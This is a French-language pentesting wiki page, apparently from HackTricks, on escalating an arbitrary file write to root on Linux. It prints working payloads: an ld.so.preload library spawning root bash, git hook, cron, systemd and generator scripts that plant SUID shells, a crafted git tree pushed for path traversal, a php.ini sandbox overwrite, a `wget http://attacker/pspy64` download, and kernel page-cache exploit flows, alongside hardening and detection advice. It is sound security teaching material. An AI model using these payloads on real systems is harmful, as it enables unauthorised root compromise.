# Écriture arbitraire de fichier en tant que root

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

`/etc/ld.so.preload` est une liste à l'échelle du système d'objets partagés que l'éditeur de liens dynamique charge avant les autres objets partagés. Le mode d'exécution sécurisée impose des restrictions supplémentaires au préchargement : un chemin de bibliothèque tel que `/tmp/pe.so` ne constitue donc pas une technique universelle pour les binaires SUID.\
Si vous pouvez créer ou modifier ce fichier, un processus qui le charge chargera la bibliothèque indiquée avant ses autres objets partagés, ce qui permet l'exécution de code dans le contexte de ce processus.<sup>[[12]](#references)</sup>

Par exemple : `echo "/tmp/pe.so" > /etc/ld.so.preload`

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unlink("/etc/ld.so.preload");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```

### Sortie OCR comme écriture de fichier contrainte

Un service OCR qui permet à l’appelant de choisir le nom du fichier enregistré peut transformer le texte reconnu dans une image en primitive d’**écriture de fichier contrainte**. Les octets enregistrés correspondent au texte reconnu, et non aux octets de l’image : vérifiez donc la sortie OCR pour détecter les erreurs de syntaxe. Si la destination autorisée est exécutable par le serveur web et accepte un nom de fichier `.php`, ce texte peut s’exécuter lorsqu’il est demandé. Dans MakeSense, une application OCR accessible localement enregistrait le texte dans `/saved/` ; son serveur PHP exécuté en tant que root exécutait ensuite le fichier enregistré en tant que root. L’écriture était limitée à ce répertoire, sans traversée de chemin démontrée.<sup>[[37]](#references)</sup>

Les privilèges obtenus lors de l’exécution sont ceux du **processus qui sert PHP**, et non automatiquement ceux de l’auteur de l’écriture OCR. Vérifiez la correspondance entre la destination et le mécanisme d’exécution, ainsi que l’identité du processus à l’exécution ; un auteur OCR root associé à un serveur web non privilégié ne ferait pas s’exécuter PHP en tant que root.<sup>[[37]](#references)</sup> Comparez avec le [web-root upload pattern](../../pentesting-web/file-upload/).

### Git hooks

Les **Git hooks** sont des scripts exécutables lancés lors d’événements dans un dépôt, notamment les opérations de commit et de merge. Si un **script ou utilisateur privilégié** effectue ces opérations et qu’un attaquant peut **écrire dans le dossier `.git`**, le hook peut servir à l’**élévation de privilèges**.<sup>[[13]](#references)</sup>

Par exemple, il est possible de **générer un script** dans un dépôt git, dans **`.git/hooks`**, afin qu’il soit toujours exécuté lorsqu’un nouveau commit est créé :

```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/0xdf' > pre-commit
chmod +x pre-commit
```

### Traversal de chemin lors de l’exportation d’un arbre Git privilégié

Un synchroniseur privilégié peut éviter un checkout et énumérer à la place un dépôt contrôlé par un attaquant à l’aide de `git ls-tree`, lire chaque blob avec `git cat-file`, joindre le chemin indiqué à un répertoire de staging, puis écrire lui-même le fichier. Cela permet une **écriture arbitraire de fichier avec les privilèges du synchroniseur** s’il combine `-c safe.directory=*` (qui désactive la protection de Git contre les dépôts appartenant à un autre utilisateur) et l’absence de vérification du confinement de la destination. Un nom d’entrée d’arbre absolu fait que `os.path.join(stage, name)` de Python ignore `stage` ; un nom relatif contenant `../` s’échappe lorsque le système de fichiers le résout. Comme l’application matérialise l’arbre brut au lieu de demander à Git de faire un checkout, le rejet des chemins lors du checkout ne protège jamais la cible de l’écriture.<sup>[[30]](#references)[[32]](#references)[[33]](#references)</sup>

Recherchez cette forme de code dans les services root, les timers, les agents de déploiement, les importateurs de modèles et les tâches de sauvegarde/restauration :<sup>[[30]](#references)</sup>

```python
entries = git("-c", "safe.directory=*", "ls-tree", "-rz", "HEAD")
for mode, oid, git_path in parse(entries):
    target = os.path.join(stage_root, git_path)  # no containment check
    os.makedirs(os.path.dirname(target), exist_ok=True)
    with open(target, "wb") as output:
        output.write(git("cat-file", "blob", oid))
```

Une entrée d’arborescence est encodée sous la forme `<mode> SP <name> NUL <raw object ID>`. L’option `git hash-object --literally` autorise délibérément des données d’objet que l’analyse normale ou `git fsck` peut rejeter. Un clone jetable peut donc créer une arborescence dont le nom de fichier correspond à une destination absolue. Cet exemple crée un blob de fichier cron, l’inclut dans un commit avec l’arborescence fabriquée, puis déplace une branche vers ce commit. L’exploitation nécessite toutefois l’autorisation de mettre à jour un dépôt utilisé par la tâche privilégiée et un serveur Git qui accepte l’objet malformé.<sup>[[30]](#references)[[31]](#references)</sup>

```bash
blob=$(printf '%s\n' '* * * * * root cp /bin/bash /tmp/rootbash && chmod 6755 /tmp/rootbash' | git hash-object -w --stdin)
{ printf '100644 /etc/cron.d/git-sync\0'; printf '%s' "$blob" | xxd -r -p; } > tree.raw
tree=$(git hash-object -w -t tree --literally --stdin < tree.raw)
commit=$(printf 'crafted tree\n' | git commit-tree "$tree")
git update-ref refs/heads/main "$commit"
git ls-tree -r main
git push --force origin main
```

Le hardening doit couvrir à la fois l’ingestion des dépôts et l’opération finale sur le système de fichiers :<sup>[[30]](#references)[[33]](#references)[[34]](#references)</sup>

- Remplacez `safe.directory=*` par les dépôts exacts auxquels le service doit faire confiance et, dans la mesure du possible, traitez les dépôts sans privilèges root.
- Rejetez les noms absolus et tout composant `.` ou `..` avant la matérialisation. Après la concaténation des chemins, canonisez le résultat et vérifiez que la destination reste dans le répertoire racine prévu.
- Évitez les conditions de concurrence symlink entre la vérification et l’ouverture : ouvrez les chemins relativement à un descripteur de répertoire de confiance et, sous Linux, utilisez `openat2()` avec `RESOLVE_BENEATH` et `RESOLVE_NO_SYMLINKS` pour les chemins contrôlés par un attaquant.
- Préférez un checkout normal dans un répertoire isolé plutôt que de réimplémenter le checkout à partir de la sortie de plumbing. Si l’ingestion d’objets bruts est nécessaire, activez la validation côté réception, par exemple avec `receive.fsckObjects=true` ; n’abaissez pas le niveau des contrôles `receive.fsck.*` liés aux chemins, nécessaires pour rejeter les arbres forgés.

### Déploiement de configuration privilégié

Certains services de gestion stockent l’état système souhaité dans un fichier de configuration, puis le déploient avec des privilèges élevés. Par exemple, [openmediavault stores configuration in `/etc/openmediavault/config.xml`](https://docs.openmediavault.org/en/7.x/faq.html), et son [RPC interface](https://docs.openmediavault.org/en/8.x/development/tools/omv_rpc.html) peut appliquer des modifications aux services. Si un compte moins privilégié peut écrire ou remplacer ce fichier, vérifiez s’il peut aussi demander un déploiement autorisé et si le module sélectionné utilise le champ modifié en tant que root. Les clés de compte SSH, les commandes planifiées et l’installation de paquets ont chacune des prérequis différents ; la simple présence d’un fichier ou le fait qu’un fichier XML soit modifiable ne prouve rien. Vérifiez les permissions du fichier et de son répertoire parent, les groupes de l’appelant et ses autorisations RPC, la version installée et le consommateur réel, sans modifier la configuration ni déclencher d’opération d’application pendant l’énumération.

Les définitions d’action Fail2Ban dans `/etc/fail2ban/action.d/` constituent une autre frontière de configuration privilégiée. Un utilisateur qui peut écrire dans ce répertoire et le parcourir peut éventuellement remplacer une définition d’action ou ajouter une surcharge, mais les permissions du répertoire ne suffisent pas à établir une exécution de code. Confirmez qu’une jail activée sélectionne réellement l’action concernée, que le service Fail2Ban l’exécute avec des privilèges supérieurs et qu’un rechargement/redémarrage autorisé ainsi qu’un événement de ban correspondant auront lieu. Une autorisation sudo sans rapport permettant de redémarrer Fail2Ban n’est pertinente que si elle s’applique exactement à l’invocation du service et que la définition modifiée est chargée. [Fail2Ban's action configuration](https://github.com/fail2ban/fail2ban/blob/master/man/jail.conf.5) documente la relation entre le répertoire des actions et les jails ; son [sample action](https://github.com/fail2ban/fail2ban/blob/master/config/action.d/iptables.conf) montre que `actionban` s’exécute lors d’un ban avec les droits de l’utilisateur du service. Examinez les permissions et la configuration effective sans modifier les actions ni déclencher de bans pendant l’énumération.

Une frontière distincte existe lorsqu’une jail Fail2Ban activée utilise une action mail enrichie par WHOIS. [CVE-2021-32749](https://github.com/fail2ban/fail2ban/security/advisories/GHSA-m985-3f3v-cwmm) concernait du texte WHOIS non fiable transmis par un pipe à `mail` de GNU mailutils, dont le traitement des caractères d’échappement pouvait exécuter une commande. Un utilisateur moins privilégié capable d’écrire des fichiers peut influencer la réponse s’il peut modifier la configuration de surcharge du serveur du **client WHOIS sélectionné** ; [`whois.conf(5)` de Debian](https://manpages.debian.org/bookworm/whois/whois.conf.5.en.html) documente un fichier de ce type, mais son chemin et son utilisation varient selon l’installation. Examinez la jail/action effective, l’identité du service, le client WHOIS réellement utilisé et son chemin de configuration, l’implémentation de mail, le contrôle de la réponse et le correctif du fournisseur installé, y compris les rétroportages. Un fichier de configuration WHOIS modifiable, une version de Fail2Ban ou une action mail ne prouvent pas à eux seuls cette chaîne ; évitez les requêtes à un serveur externe et le déclenchement de bans pendant l’énumération passive.

### Création de fichiers TFTP et hooks de paquets privilégiés

Un service TFTP accessible peut franchir une frontière de conteneur ou d’utilisateur local lorsque ses paramètres tftpd-hpa **effectifs** l’exécutent en tant que root, exposent la racine du système de fichiers comme répertoire `--secure` et activent `--create`. [The tftpd-hpa manual](https://manpages.debian.org/trixie/tftpd-hpa/tftpd.8.en.html) décrit les options de création et d’utilisateur. Cela peut permettre de créer un nouveau fichier dans un répertoire de configuration privilégié, notamment `/etc/apt/apt.conf.d/` ; un fichier existant peut toutefois résister au remplacement. [APT's configuration manual](https://manpages.debian.org/bookworm/apt/apt.conf.5.en.html) documente les commandes `APT::Update::Pre-Invoke`. Un `apt update` exécuté en tant que root peut devenir le consommateur aux privilèges supérieurs **uniquement s’il** lit le nouveau fichier de configuration. Vérifiez les arguments et l’identité réels du démon en cours d’exécution, l’accessibilité réseau et le filtrage, les règles de création dans le répertoire cible, la portée effective de la configuration APT et l’existence d’une invocation privilégiée ultérieure. Un fichier par défaut, un répertoire cible modifiable ou une commande APT planifiée ne prouvent pas à eux seuls l’ensemble de la chaîne. Un triage passif doit se limiter à la lecture de la configuration locale et des métadonnées, avec des limites de taille, sans envoyer de fichier ni invoquer APT.

### Fichiers Cron et temporels

Si vous pouvez **écrire dans des fichiers liés à cron exécutés par root**, vous pouvez généralement obtenir une exécution de code lors de la prochaine exécution de la tâche. Voici quelques cibles intéressantes :<sup>[[14]](#references)[[20]](#references)</sup>

- `/etc/crontab`
- `/etc/cron.d/*`
- `/etc/cron.hourly/*`, `/etc/cron.daily/*`, `/etc/cron.weekly/*`, `/etc/cron.monthly/*`
- La crontab de root dans `/var/spool/cron/` ou `/var/spool/cron/crontabs/`
- Les timers `systemd` et les services qu’ils déclenchent

Vérifications rapides :

```bash
ls -la /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
find /var/spool/cron* -maxdepth 2 -type f -ls 2>/dev/null
systemctl list-timers --all 2>/dev/null
grep -R "run-parts\\|cron" /etc/crontab /etc/cron.* /etc/cron.d 2>/dev/null
```

Chemins d’exploitation typiques :

- **Ajouter une nouvelle tâche cron root** à `/etc/crontab` ou dans un fichier de `/etc/cron.d/`
- **Remplacer un script** déjà exécuté par `run-parts`
- **Installer une backdoor dans la cible d’un timer existant** en modifiant le script ou le binaire qu’il lance

Exemple minimal de payload cron :

```bash
echo '* * * * * root cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' >> /etc/crontab
```

Si vous ne pouvez écrire que dans un répertoire cron utilisé par `run-parts`, déposez-y plutôt un fichier exécutable :

```bash
cat > /etc/cron.daily/backup <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4777 /tmp/rootbash
EOF
chmod +x /etc/cron.daily/backup
```

Notes :

- `run-parts` ignore généralement les noms de fichiers contenant des points ; préférez donc des noms comme `backup` plutôt que `backup.sh`.<sup>[[15]](#references)</sup>
- Certains systèmes utilisent des timers `systemd` plutôt que cron classique, mais l’idée d’abus reste la même : **modifier ce que root exécutera plus tard**.<sup>[[20]](#references)</sup>

### Fichiers de service et de socket

Si vous pouvez écrire dans des **fichiers unit `systemd`** ou dans les fichiers auxquels ils font référence, vous pouvez peut-être exécuter du code en tant que root en rechargeant et en redémarrant l’unit, ou en attendant que le mécanisme d’activation du service/socket se déclenche.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)</sup>

Vérifiez également les droits d’écriture et de recherche sur le répertoire des units système lui-même, y compris les ACL : un utilisateur peut créer une nouvelle unit dans `/etc/systemd/system` même si la lecture ou l’affichage du contenu du répertoire est refusé. Ce chemin, à lui seul, ne démarre rien. Vérifiez que le gestionnaire système chargera la nouvelle unit, que l’appelant dispose d’un droit effectif `systemctl start` ou `restart` permettant d’agir en tant que root sur son nom (ou d’un autre mécanisme d’activation privilégié), et que le service s’exécute sous l’identité prévue. Une unit existante déjà chargée et modifiée sur le disque peut nécessiter `daemon-reload` ; le comportement de chargement diffère pour une unit portant un nouveau nom. Examinez précisément les arguments et les exclusions de sudo avant de considérer qu’une règle de redémarrage avec joker suffit. Consultez le [chemin de recherche des units systemd](https://www.freedesktop.org/software/systemd/man/latest/systemd.unit.html) et la [sémantique de chargement et de rechargement de systemctl](https://www.freedesktop.org/software/systemd/man/latest/systemctl.html).

Parmi les cibles intéressantes :

- `/etc/systemd/system/*.service`
- `/etc/systemd/system/*.socket`
- Les overrides drop-in dans `/etc/systemd/system/<unit>.d/*.conf`
- Les scripts/binaires de service référencés par `ExecStart=`, `ExecStartPre=`, `ExecStartPost=`
- Les chemins `EnvironmentFile=` accessibles en écriture et chargés par un service root

Vérifications rapides :

```bash
ls -la /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
systemctl list-units --type=service --all 2>/dev/null
systemctl list-units --type=socket --all 2>/dev/null
grep -R "^ExecStart=\\|^EnvironmentFile=\\|^ListenStream=" /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
```

Voies d’abus courantes :

- **Remplacer `ExecStart=`** dans une unité de service appartenant à root que vous pouvez modifier
- **Ajouter un override drop-in** avec un `ExecStart=` malveillant et effacer d’abord l’ancien
- **Installer une backdoor dans le script/binaire** déjà référencé par l’unité
- **Détourner un service activé par socket** en modifiant le fichier `.service` correspondant, qui démarre lorsque le socket reçoit une connexion

Exemple d’override malveillant :

```ini
[Service]
ExecStart=
ExecStart=/bin/sh -c 'cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash'
```

Flux d’activation typique :

```bash
systemctl daemon-reload
systemctl restart vulnerable.service
# or trigger the socket-backed service by connecting to it
```

Si vous ne pouvez pas redémarrer vous-même des services, mais que vous pouvez modifier une unité activée par socket, il vous suffit peut-être **d’attendre une connexion client** pour déclencher l’exécution du service backdooré en tant que root.<sup>[[17]](#references)</sup>

### Répertoires des generators systemd

Les **system generators** sont des exécutables lancés par le gestionnaire système avant le chargement des fichiers d’unité, au démarrage comme lors du rechargement de la configuration. Par conséquent, un accès en écriture à un répertoire de system generators (ou à un exécutable generator existant) constitue un moyen direct d’exécuter du code en root, facilement négligé lors d’un audit qui ne vérifie que les fichiers `*.service` et `*.timer`.<sup>[[35]](#references)[[36]](#references)</sup>

L’ordre de recherche habituel est `/run/systemd/system-generators/`, `/etc/systemd/system-generators/`, `/usr/local/lib/systemd/system-generators/` puis `/usr/lib/systemd/system-generators/` (certaines distributions exposent `/lib/systemd/system-generators/` via la fusion de `/usr`). Un exécutable portant le même nom dans un répertoire antérieur masque celui des répertoires suivants. Ne confondez pas ces **répertoires d’exécutables d’entrée** avec `/run/systemd/generator`, `/run/systemd/generator.early` et `/run/systemd/generator.late`, qui contiennent les unités temporaires produites par les generators.<sup>[[35]](#references)</sup>

Vérifications rapides :

```bash
for d in /run/systemd/system-generators /etc/systemd/system-generators \
         /usr/local/lib/systemd/system-generators /usr/lib/systemd/system-generators \
         /lib/systemd/system-generators; do
    [ -e "$d" ] || continue
    namei -l "$d"
    find "$d" -maxdepth 1 -writable -ls 2>/dev/null
    getfacl -p "$d" "$d"/* 2>/dev/null
done
```

Un générateur nouvellement créé doit avoir son bit d’exécution activé. Si la primitive d’écriture permet de contrôler les octets, mais pas le mode, ciblez un générateur déjà exécutable ; le tronquer sur place préserve généralement ses métadonnées. Si le répertoire lui-même est accessible en écriture, créez une nouvelle entrée et rendez-la exécutable.<sup>[[35]](#references)</sup>

```bash
cat > /etc/systemd/system-generators/zz-update <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown 0:0 /tmp/rootbash
chmod 4755 /tmp/rootbash
rm -f "$0"
EOF
chmod 755 /etc/systemd/system-generators/zz-update
```

Déclencher `systemctl daemon-reload` sur le gestionnaire **system** nécessite une autorisation appropriée, mais relance tous les générateurs système ; sinon, attendez un rechargement avec privilèges, une opération de package ou un redémarrage. Les répertoires de générateurs utilisateur comme `~/.config/systemd/user-generators/` s’exécutent sous le gestionnaire utilisateur et ne donnent **pas** accès à root à eux seuls.<sup>[[35]](#references)</sup>

Pour renforcer la sécurité et rechercher des activités suspectes, vérifiez chaque composant du chemin et les ACL, pas seulement les bits de mode finaux ; établissez une base de référence des hash et de la propriété des packages des générateurs ; et déclenchez des alertes en cas de création, de renommage, de modification du contenu ou des permissions dans tous les répertoires d’entrée des générateurs système. Surveiller l’écriture est important, car un générateur à exécution unique peut s’autosupprimer après son exécution, tandis que l’arborescence des unités générées sous `/run/systemd/generator*` est reconstruite au prochain rechargement.<sup>[[35]](#references)[[36]](#references)</sup>

### Remplacer un `php.ini` restrictif utilisé par un bac à sable PHP privilégié

Certains daemons personnalisés valident le PHP fourni par l’utilisateur en exécutant `php` avec un **`php.ini` restreint** (par exemple, `disable_functions=exec,system,...`). Si le code exécuté dans le bac à sable dispose toujours d’**une primitive d’écriture quelconque** (comme `file_put_contents`) et que vous pouvez atteindre le **chemin exact du `php.ini`** utilisé par le daemon, vous pouvez **remplacer cette configuration** pour lever les restrictions, puis soumettre un second payload qui s’exécute avec des privilèges élevés.<sup>[[2]](#references)</sup>

Déroulement habituel :

1. Le premier payload remplace la configuration du bac à sable.
2. Le second payload exécute le code, maintenant que les fonctions dangereuses sont réactivées.

Exemple minimal (remplacez le chemin utilisé par le daemon) :

```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```

Si le daemon s’exécute en tant que root (ou valide des chemins appartenant à root), la deuxième exécution s’effectue dans un contexte root. Il s’agit essentiellement d’une **élévation de privilèges via l’écrasement de la configuration** lorsque le runtime sandboxé peut encore écrire des fichiers.

### binfmt_misc

`binfmt_misc` expose les enregistrements sous `/proc/sys/fs/binfmt_misc` ; chaque enregistrement associe un motif de type de fichier à un interpréteur. L’impact sur les privilèges dépend de qui peut modifier l’enregistrement et du processus qui exécutera ensuite le fichier correspondant. Vérifiez donc ces conditions avant de considérer cela comme une voie d’élévation de privilèges.<sup>[[21]](#references)</sup>

Un helper exécutable doté de `CAP_DAC_OVERRIDE` peut constituer une autre voie d’enregistrement s’il accepte des données contrôlées par l’appelant et les écrit dans `/proc/sys/fs/binfmt_misc/register`, même si l’appelant ne peut pas écrire directement dans ce nœud. Examinez les données d’entrée du helper et son comportement d’écriture sans l’exécuter pendant l’énumération. Si une règle enregistrée utilise le flag `C`, l’interpréteur reçoit des identifiants basés sur le binaire correspondant ; un fichier SUID appartenant à root peut donc lancer un interpréteur contrôlé par l’appelant en tant que root. Vérifiez le montage et la politique d’enregistrement de `binfmt_misc`, la capacité effective du helper, la règle exacte et le chemin de l’interpréteur, la cible SUID exécutable, ainsi que la présence éventuelle de `no_new_privs` ou d’un montage `nosuid` qui empêcherait la transition SUID. Un bit de capacité ou une chaîne contenant un chemin ne constitue qu’une piste à examiner.<sup>[[21]](#references)</sup> Consultez [execve(2)](https://man7.org/linux/man-pages/man2/execve.2.html) pour connaître les conditions qui empêchent l’application de SUID.

### Écraser les gestionnaires de schéma (comme http: ou https:)

Les environnements de bureau utilisent les associations MIME et les entrées desktop pour choisir une application pour les schémas URI ; un attaquant qui peut écrire dans la configuration de l’utilisateur concerné et dans les répertoires d’entrées desktop peut rediriger ces schémas vers un lanceur qu’il contrôle. En modifiant le fichier `$HOME/.config/mimeapps.list` pour associer les gestionnaires d’URL HTTP et HTTPS à un fichier malveillant (par exemple, `x-scheme-handler/http=evil.desktop` et `x-scheme-handler/https=evil.desktop`), un clic de l’utilisateur peut lancer cette entrée desktop.<sup>[[22]](#references)[[23]](#references)[[24]](#references)</sup>

```bash
[Desktop Entry]
Type=Application
Name=Evil Desktop Entry
Exec=/bin/sh -c "id > /tmp/mime-handler-pwned"
MimeType=x-scheme-handler/http;x-scheme-handler/https;
```

### Root exécutant des scripts/binaires modifiables par un utilisateur

Si un workflow privilégié exécute quelque chose comme `/bin/sh /home/username/.../script` (ou n’importe quel binaire situé dans un répertoire appartenant à un utilisateur non privilégié), vous pouvez le détourner :<sup>[[1]](#references)</sup>

- **Détecter l’exécution :** surveillez les processus avec pspy pour repérer root invoquant des chemins contrôlés par un utilisateur.<sup>[[25]](#references)</sup>

```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```

- **Confirmer que l’écriture est possible :** vérifiez que le fichier cible et son répertoire appartiennent à votre utilisateur et que vous pouvez y écrire.
- **Détourner la cible :** sauvegardez le binaire/script d’origine et déposez un payload qui crée un shell SUID (ou effectue toute autre action en tant que root), puis restaurez les permissions :

```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```

- **Déclenchez l’action privilégiée** (par exemple, en appuyant sur un bouton d’interface qui lance le helper). Lorsque root réexécute le chemin détourné, récupérez le shell avec les privilèges élevés à l’aide de `./rootshell -p`.

### Modification de binaires privilégiés dans le cache de pages uniquement

Certains bugs du noyau ne modifient pas le fichier **sur disque**. Ils permettent plutôt de modifier uniquement la **copie dans le cache de pages** d’un fichier lisible. Si vous pouvez cibler un binaire **setuid** ou autrement **exécuté par root**, la prochaine exécution peut lancer des octets contrôlés par l’attaquant depuis la mémoire et élever les privilèges, même si le hash du fichier sur disque n’a pas changé.<sup>[[3]](#references)[[4]](#references)</sup>

Il est utile de voir cela comme une **primitive d’écriture de fichier limitée à l’exécution** :<sup>[[3]](#references)</sup>

- **Le disque reste propre** : l’inode et les octets sur disque ne changent pas
- **La mémoire est modifiée** : les processus qui lisent ou exécutent la page mise en cache obtiennent le contenu modifié par l’attaquant
- **L’effet est temporaire** : la modification disparaît après un redémarrage ou l’éviction du cache

Cette primitive se situe entre l’**écriture arbitraire de fichier** classique et les anciens bugs d’**abus du cache de pages** tels que Dirty COW / Dirty Pipe :<sup>[[3]](#references)</sup>

- Dirty COW reposait sur une condition de concurrence
- Dirty Pipe imposait des contraintes sur la position d’écriture
- Une primitive limitée au cache de pages peut être plus fiable si le chemin vulnérable permet des écritures directes dans les pages mises en cache et adossées à un fichier

#### Flux générique de privesc

1. Obtenir une primitive du noyau permettant d’écrire dans les **pages du cache de pages adossées à un fichier**
2. L’utiliser contre un **binaire privilégié lisible** ou un autre fichier exécuté par root
3. Déclencher l’exécution **avant** l’éviction de la page du cache
4. Obtenir l’exécution de code en tant que root alors que le fichier sur disque semble toujours intact

Cibles typiques à forte valeur :

- Binaires **setuid-root**
- Helpers lancés par des **services root**
- Binaires couramment exécutés depuis des **conteneurs partageant le noyau/cache de pages de l’hôte**

#### Chemin d’exemple avec AF_ALG + `splice()`

Copy Fail (CVE-2026-31431) est un bon exemple de cette classe. Le chemin vulnérable se trouvait dans l’API crypto de l’espace utilisateur Linux (`AF_ALG` / `algif_aead`) :<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>

- `splice()` peut déplacer des références vers des pages du cache de pages d’un fichier lisible vers la scatterlist TX crypto
- le chemin de déchiffrement en place de `algif_aead` réutilisait les buffers source et destination
- `authencesn` écrivait ensuite dans la région du tag de destination
- lorsque cette région référençait encore des pages adossées au fichier et insérées avec `splice()`, l’écriture atterrissait dans le **cache de pages du fichier cible**

La technique intéressante n’est donc pas le CVE lui-même, mais le schéma :

- **fournir des pages du cache adossées à un fichier à un sous-système du noyau**
- faire en sorte que le sous-système **les traite comme une sortie modifiable**
- déclencher un petit écrasement contrôlé en mémoire

Le PoC public utilisait des **écritures répétées de 4 octets** pour modifier `/usr/bin/su` en mémoire, puis l’exécutait.<sup>[[4]](#references)[[7]](#references)</sup>

#### Chemin d’exemple avec ESP / XFRM + clone netfilter TEE

DirtyClone (CVE-2026-43503) illustre une autre variante du même schéma **d’écriture vers root limitée au cache de pages**, mais cette fois, le point d’écriture est le **déchiffrement IPsec ESP** plutôt que `AF_ALG`.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

La technique importante est l’étape de **falsification des métadonnées** :

- `splice()` place une **page du cache de pages adossée à un fichier en lecture seule** dans un paquet ESP-in-UDP
- la mitigation DirtyFrag d’origine marquait ce skb avec `SKBFL_SHARED_FRAG` afin qu’`esp_input()` **copie les données avant de les déchiffrer**
- netfilter `TEE` duplique le paquet via `nf_dup_ipv4()` -> `__pskb_copy_fclone()`
- le clone conserve la **même référence physique à la page du cache de pages**, mais perd `SKBFL_SHARED_FRAG`
- `esp_input()` considère alors le clone comme sûr et effectue un **déchiffrement `cbc(aes)` en place** sur la page adossée au fichier

La leçon à retenir pour les relecteurs dépasse le CVE : si une mitigation s’appuie sur les **métadonnées skb/page** pour décider si une opération doit d’abord copier les données, tout **chemin de clonage/copie qui conserve la page sous-jacente mais supprime les métadonnées** peut réactiver silencieusement la primitive d’écriture.

Flux d’exploitation typique :

1. `unshare(CLONE_NEWUSER | CLONE_NEWNET)` pour obtenir **`CAP_NET_ADMIN` dans un espace de noms réseau privé**
2. activer loopback et installer une **règle netfilter `TEE`** dans `mangle/OUTPUT`
3. installer des SA de transport XFRM ESP via `NETLINK_XFRM`
4. encoder chaque mot cible de 4 octets dans le champ `seq_hi` de la SA (l’astuce de sélection de mots de DirtyFrag)
5. envoyer le paquet ESP-in-UDP inséré avec `splice()` afin que le **clone TEE** atteigne `esp_input()` et effectue le déchiffrement **en place**
6. répéter jusqu’à ce que la copie dans le cache de pages de `/usr/bin/su` ou d’un autre exécutable privilégié contienne du code contrôlé par l’attaquant

En pratique, l’impact est le même que dans l’exemple `AF_ALG` : le fichier sur disque reste propre, mais `execve()` utilise les **octets modifiés du cache de pages** et donne root.<sup>[[8]](#references)[[9]](#references)</sup>

Vérifications utiles pour déterminer l’exposition à cette variante :

```bash
unshare -Urn true 2>/dev/null && echo "user+net namespaces available"
sysctl kernel.apparmor_restrict_unprivileged_userns 2>/dev/null
modprobe -n -v xt_TEE 2>/dev/null
modprobe -n -v esp4 2>/dev/null
modprobe -n -v esp6 2>/dev/null
lsmod | egrep 'xt_TEE|nf_dup_ipv4|esp4|esp6|x_tables'
```

La réduction à court terme de la surface d’attaque dépend aussi du chemin concerné ici : passer à un kernel intégrant `48f6a5356a33` corrige le chemin `clone`, tandis que bloquer l’autoload de `xt_TEE` supprime l’**étape de blanchiment du flag** et bloquer `esp4` / `esp6` supprime le **sink de déchiffrement**.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

#### Exposition et recherche de traces

Si vous suspectez cette classe de bug, ne vous fiez pas uniquement aux contrôles d’intégrité du disque. Vérifiez également :

```bash
uname -r
grep CONFIG_CRYPTO_USER_API_AEAD= /boot/config-$(uname -r) 2>/dev/null
lsmod | grep algif_aead
find / -perm -4000 -type f 2>/dev/null
```

Les valeurs de configuration ci-dessous distinguent une interface chargeable d’une interface intégrée au kernel ; les règles de compilation crypto associent `CONFIG_CRYPTO_USER_API_AEAD` à `algif_aead`.<sup>[[26]](#references)[[27]](#references)</sup>

- `CONFIG_CRYPTO_USER_API_AEAD=m` : `algif_aead` peut être chargé/déchargé en tant que module
- `CONFIG_CRYPTO_USER_API_AEAD=y` : l’interface est intégrée au kernel
- les binaires setuid sont de bonnes cibles, car un correctif limité au page-cache peut suffire à transformer un accès local en root

#### Réduction de la surface d’attaque pour le chemin `algif_aead`

Si l’interface vulnérable est fournie par un module chargeable :<sup>[[6]](#references)[[28]](#references)[[29]](#references)</sup>

```bash
echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif.conf
rmmod algif_aead 2>/dev/null || true
```

Si cela est compilé dans le noyau, certains rapports ont signalé le blocage du chemin init avec :<sup>[[28]](#references)</sup>

```bash
initcall_blacklist=algif_aead_init
```

Ce type de mesure d’atténuation mérite aussi d’être retenu pour d’autres LPE du noyau : si l’exploitation dépend d’une interface optionnelle spécifique, désactiver ou blacklister cette interface peut interrompre le vecteur d’exploitation avant même qu’une mise à niveau complète du noyau soit disponible.<sup>[[6]](#references)[[28]](#references)</sup>



{{#include ../../banners/hacktricks-training.md}}

## References

- [1] [HTB Bamboo – détournement d’un script exécuté par root dans un répertoire PaperCut modifiable par un utilisateur](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [2] [HTB : Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)
- [3] [Tenable : Copy Fail (CVE-2026-31431) — FAQ](https://www.tenable.com/blog/copy-fail-cve-2026-31431-frequently-asked-questions-about-linux-kernel-privilege-escalation)
- [4] [Divulgation Openwall oss-security pour CVE-2026-31431](https://www.openwall.com/lists/oss-security/2026/04/29/23)
- [5] [Correctif Linux stable : crypto: algif_aead - revenir au fonctionnement hors place](https://git.kernel.org/stable/c/a664bf3d603dc3bdcf9ae47cc21e0daec706d7a5)
- [6] [Copy Fail — avis CVE-2026-31431](https://copy.fail/)
- [7] [Analyse technique de Theori / Xint](https://xint.io/blog/copy-fail-linux-distributions)
